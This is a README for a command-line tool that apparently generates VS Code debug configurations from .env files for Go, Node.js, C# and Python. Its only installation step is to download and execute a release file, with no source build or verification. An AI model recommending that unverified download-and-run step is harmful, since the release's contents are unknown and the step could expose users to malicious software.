# Generate VS Code Launch 🚀

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Downloads](https://img.shields.io/badge/downloads-1000%2B-yellow.svg)

Welcome to the **Generate VS Code Launch** repository! This tool simplifies your development process by auto-generating Visual Studio Code debug configurations from your `.env` files. It supports multiple programming languages, including Go, Node.js, C#, and Python. 

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Supported Languages](#supported-languages)
- [Configuration](#configuration)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features 🌟

- **Automatic Configuration**: Generate debug configurations with minimal effort.
- **Multi-Language Support**: Works with Go, Node.js, C#, and Python.
- **Easy Integration**: Seamlessly integrates with your existing projects.
- **Customizable**: Tailor the generated configurations to fit your needs.
- **Command Line Interface**: Operate the tool easily through the command line.

## Installation ⚙️

To get started, download the latest release from the [Releases section](https://github.com/safwanhuyawrr/generate-vscode-launch/releases). You need to download and execute the file to set it up on your machine.

### Prerequisites

Before you install, ensure you have the following:

- Visual Studio Code installed.
- The respective programming language environment set up on your machine.

## Usage 📖

Once you have installed the tool, you can start generating your launch configurations.

1. Navigate to your project directory.
2. Run the command:
   ```
   generate-vscode-launch
   ```
3. The tool will read your `.env` file and create the necessary launch configurations in your `.vscode` folder.

### Example

For a Node.js project, your `.env` file might look like this:

```
PORT=3000
DEBUG=true
```

After running the tool, your `.vscode/launch.json` will be automatically populated with the appropriate configurations.

## Supported Languages 🖥️

- **Go**: Auto-generate configurations for Go applications.
- **Node.js**: Simplify debugging for your Node.js projects.
- **C#**: Get started with C# debugging quickly.
- **Python**: Easily set up Python debugging configurations.

## Configuration ⚙️

You can customize the generated configurations by modifying the command-line options. For example, you can specify the output directory or choose a specific language.

### Command-Line Options

- `--output <directory>`: Specify the output directory for the generated files.
- `--language <language>`: Choose the programming language (go, nodejs, csharp, python).

## Contributing 🤝

We welcome contributions! If you have suggestions or improvements, please fork the repository and submit a pull request. 

### Steps to Contribute

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request with a clear description of your changes.

## License 📜

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact 📬

For questions or feedback, please reach out via GitHub issues or contact the repository owner directly.

Thank you for using **Generate VS Code Launch**! For the latest updates, visit the [Releases section](https://github.com/safwanhuyawrr/generate-vscode-launch/releases).